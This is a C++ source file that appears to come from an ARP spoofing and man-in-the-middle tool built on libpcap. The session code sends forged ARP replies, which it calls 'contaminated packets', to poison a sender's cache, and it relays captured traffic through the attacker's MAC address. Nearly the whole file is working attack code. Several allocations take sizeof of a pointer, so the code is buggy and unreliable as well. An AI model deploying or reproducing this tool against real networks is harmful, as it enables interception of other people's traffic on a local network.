#include "stdafx.h"
#include "Session.h"

void Session::set(int sn, char* sender_mac, char* sender_ip, char* target_mac, char* target_ip, pcap_t* handle, char* attacker_mac, struct Parameter_Pthread* pt){
    pthread_t thread;
    this->session_Num = sn;
    this->smac = (char*)malloc(sizeof(sender_mac));
    if(this->smac == NULL){ perror("this.smac malloc error"); exit(1); }
    this->sip = (char*)malloc(sizeof(sender_mac));
    if(this->sip == NULL){ perror("this.sip malloc error"); exit(1); }
    this->tmac = (char*)malloc(sizeof(sender_mac));
    if(this->tmac == NULL){ perror("this.tmac malloc error"); exit(1); }
    this->tip = (char*)malloc(sizeof(sender_mac));
    if(this->tip == NULL){ perror("this.tip malloc error"); exit(1); }
    this->attack_mac = (char*)malloc(sizeof(attacker_mac));
    if(this->attack_mac == NULL){ perror("this.tip malloc error"); exit(1); }
    strncpy(this->sip, sender_ip, strlen(sender_ip));
    strncpy(this->smac, sender_mac, strlen(sender_mac));
    strncpy(this->tip, target_ip, strlen(target_ip));
    strncpy(this->tmac, target_mac, strlen(target_mac));
    strncpy(this->attack_mac, attacker_mac, strlen(attacker_mac));
    this->handle = handle;
    pthread_create(&thread, NULL, Attack, (void*)(pt));
    pthread_detach(thread);
}

void Session::handle_session(){
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(this->handle, &header, &packet);
    if (res == -1 || res == -2) return ;
    printf("\n@ ######################## @\n");
    printf("[ -- Session < %d > %u Bytes captured -- ]\n", this->session_Num, header->caplen);

    printf("[ -------_Ethernet_------- ]\n");
    uint8_t tmp = 0; // Ethernet header size
    int isCorrect = 0;
    Ethernet_header eh;
    tmp = eh.Print_Eth(packet);
    isCorrect = eh.Check_Eth(packet, this->smac, this->tmac, this->attack_mac);

    printf("isCorrect : %d\n", isCorrect);
    // Check spoofed packets
    if(isCorrect == 2){
        for(int x = 0; x < SESSION_NUM; x++){
            if(this->session_Num == x){
                printf("[ --_Session Number_-- : %d ]\n", x);
                break;
            }
        }
        if(tmp == 1){
            printf("[ ----------_IP_---------- ]\n");
            packet += 14;
            char* tmp2; // IP protocol type
            IP_header ih;
            tmp2 = ih.Print_IP(packet);
            if(!strcmp(tmp2, "6"))
                printf("[ ---------_TCP_--------- ]\n");
            else if(!strcmp(tmp2, "11"))
                printf("[ ---------_UDP_--------- ]\n");
            else
                printf("[ ------_Unknown Protocol_------ ]\n");
            packet += 20;
            TCP_header th;
            UDP_header uh;
            if(!strcmp(tmp2, "6")){
                th.Print_TCP(packet);
            }
            else if(!strcmp(tmp2, "11")){
                uh.Print_UDP(packet);
            }
            else printf("< No Data here for this protocol! >\n");

            // Relay
            // change sender mac address to my mac address
            packet -= 34;
            struct ARP_header* Ah = (struct ARP_header*)(packet);
            struct in_addr src_in_addr;
            // attacker's ip -> sender's ip
            tomar_ip_addr(&src_in_addr, this->sip);
            memcpy(Ah->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);

            // sender's mac -> attacker's mac
            tomar_mac_addr(Ah->src_mac_addr, this->attack_mac);
            tomar_mac_addr(Ah->sender_mac_addr, this->attack_mac);

            // attacker's mac -> target's mac
            tomar_mac_addr(Ah->Destination_mac_addr, this->tmac);
            tomar_mac_addr(Ah->target_ip_addr, this->tmac);

            char* aa = (char*)malloc(sizeof(20));
            if(aa == NULL){ perror("aa malloc error"); exit(1); }
            sprintf(aa, "%02x%02x%02x%02x%02x%02x", Ah->sender_mac_addr[0], Ah->sender_mac_addr[1], Ah->sender_mac_addr[2], Ah->sender_mac_addr[3], Ah->sender_mac_addr[4], Ah->sender_mac_addr[5]);
            char* bb = (char*)malloc(sizeof(20));
            if(bb == NULL){ perror("aa malloc error"); exit(1); }
            sprintf(bb, "%02x%02x%02x%02x%02x%02x", Ah->target_ip_addr[0], Ah->target_ip_addr[1], Ah->target_ip_addr[2], Ah->target_ip_addr[3], Ah->target_ip_addr[4], Ah->target_ip_addr[5]);

            printf("this->attack_mac : %s\n", this->attack_mac);
            printf("Changed sender mac address : %s\n", aa);
            printf("this->tip : %s\n", this->tip);
            printf("Changed target mac address: %s\n", bb);
            if(pcap_sendpacket(this->handle,  reinterpret_cast<u_char*>(Ah), 42) != 0){
                perror("send packet error");
                exit(1);
            }
            Ethernet_header eh1;
            eh1.Print_Eth(packet);
            printf("\n");
        }
        else if(tmp == 2){
            printf("[ ----------_IP_---------- ]\n");
        }
    }
    // Check broadcast packets sended by sender
    else if(isCorrect == 11){
        struct ARP_header* Ah2 = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
        struct in_addr src_in_addr, target_in_addr;

        Ah2->frame_type = htons(ARP_FRAME_TYPE);
        Ah2->mac_type = htons(ETHER_MAC_TYPE);
        Ah2->prot_type = htons(IP_PROTO_TYPE);
        Ah2->mac_addr_size = ETH_MAC_ADDR_LEN;
        Ah2->prot_addr_size = IP_ADDR_LEN;
        Ah2->op = htons(OP_ARP_REPLY);

        // target -> sender
        tomar_ip_addr(&src_in_addr, this->tip);
        tomar_ip_addr(&target_in_addr, this->sip);
        memcpy(Ah2->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
        memcpy(Ah2->target_ip_addr, &target_in_addr, IP_ADDR_LEN);

        tomar_mac_addr(Ah2->Destination_mac_addr, this->smac);
        tomar_mac_addr(Ah2->target_mac_addr, this->smac);
        tomar_mac_addr(Ah2->src_mac_addr, this->attack_mac);
        tomar_mac_addr(Ah2->sender_mac_addr, this->attack_mac);
        bzero(Ah2->padding, 18);

        // attack 2 times
        for(int i = 0 ; i < 2; i++){
            if(pcap_sendpacket(this->handle,  reinterpret_cast<u_char*>(Ah2), 42) != 0){
                perror("send packet error");
                exit(1);
            }
            printf("Success to send contaminated packet!\n");
        }
    }
    // Check unicast packets sended by sender to target
    else if(isCorrect == 101){
        struct ARP_header* attack_packet = (struct ARP_header*)malloc(sizeof(struct ARP_header)); // reply
        struct in_addr src_in_addr, target_in_addr;
        attack_packet->frame_type = htons(ARP_FRAME_TYPE);
        attack_packet->mac_type = htons(ETHER_MAC_TYPE);
        attack_packet->prot_type = htons(IP_PROTO_TYPE);
        attack_packet->mac_addr_size = ETH_MAC_ADDR_LEN;
        attack_packet->prot_addr_size = IP_ADDR_LEN;
        attack_packet->op = htons(OP_ARP_REPLY);

        tomar_ip_addr(&src_in_addr, this->tip);
        tomar_ip_addr(&target_in_addr, this->sip);

        tomar_mac_addr(attack_packet->Destination_mac_addr, this->smac);
        tomar_mac_addr(attack_packet->target_mac_addr, this->smac);
        tomar_mac_addr(attack_packet->src_mac_addr, this->attack_mac);
        tomar_mac_addr(attack_packet->sender_mac_addr, this->attack_mac);

        memcpy(attack_packet->sender_ip_addr, &src_in_addr, IP_ADDR_LEN);
        memcpy(attack_packet->target_ip_addr, &target_in_addr, IP_ADDR_LEN);

        bzero(attack_packet->padding, 18);

        for(int i = 0 ; i < 2; i++){
            if(pcap_sendpacket(this->handle, reinterpret_cast<u_char*>(attack_packet), 42) != 0){
                perror("send packet error");
                exit(1);
            }
            printf("Success to send contaminated packet!\n");
        }
    }
    else{
        printf("This packet has no relation with this program.\n");
    }
}

